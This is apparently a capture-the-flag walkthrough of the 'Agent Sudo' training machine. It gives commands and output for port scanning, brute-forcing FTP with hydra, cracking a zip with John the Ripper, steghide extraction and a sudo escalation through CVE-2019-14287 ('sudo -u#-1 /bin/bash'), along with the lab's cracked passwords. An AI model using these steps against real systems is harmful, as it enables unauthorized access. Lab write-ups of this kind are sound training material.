# Agent Sudo
# You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth
# 
# Difficulty: Easy
#
# Questions:
# 1. Deploy the machine
# 2. How many open ports?
# 3. How you redirect yourself to a secret page?
# 4. What is the agent name?
# 5. FTP password
# 6. Zip file password
# 7. steg password
# 8. Who is the other agent (in full name)?
# 9. SSH password
# 10. What is the user flag?
# 11. What is the incident of the photo called?
# 12. CVE number for the escalation 
# 13. What is the root flag?
# 14. (Bonus) Who is Agent R?

# Adding ip to env
export IP=10.10.59.141

# Nmap scanning
nmap $IP -sT -sV -sV -oA nmap/res

Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-17 08:50 EST
Nmap scan report for 10.10.59.141
Host is up (0.079s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.40 seconds

# Discovering web site

Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 

# Dirbusting via gobuster
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out -x php,sh,txt,js,css,html,py,dic

# Nothing found

# Let's try to change user-agent using burp suite to access another web page using alphabet as a list for brute forcing 
# agent_C_attention.php found
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 

# Trying to brute force ftp for user chris
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.59.141

[21][ftp] host: 10.10.59.141   login: chris   password: crystal

# Going to ftp
# 3 files found
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png

# Txt file contains following text
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

# In picture cutie.png some information found
# Let's extract it with binwalk
binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

# Text file To_agentR.txt is empty
# 8702.zip archive is protected by password
# Let's crack archive brutting it via John the ripper
# Getting hash from archive 
zip2john 8702.zip > hash.john

# Cracking hash
john hash.john --wordlist=/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:01 DONE (2022-12-17 10:57) 0.7936g/s 19504p/s 19504c/s 19504C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

# New To_agentR.txt file contains following info
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

# QXJlYTUx looks like base 64 
echo QXJlYTUx | base64 -d

Area51

# jpg file could hide some content
# Let's check it via steghide
steghide --extract -sf *.jpg

# it requaires a passphrase
# I think it is Area51
# Yeah!

# We've got message.txt file with following content
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

# Looks like ssh credentials
# It is

# user flag found in home directory such as a picture for question 11

# Now let's get root
# Let's check sudo options
sudo -l

Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

# Hmmmmmm... Looks like we have CVE-2019-14287

sudo -u#-1 /bin/bash

# BOOM! Car is pwned
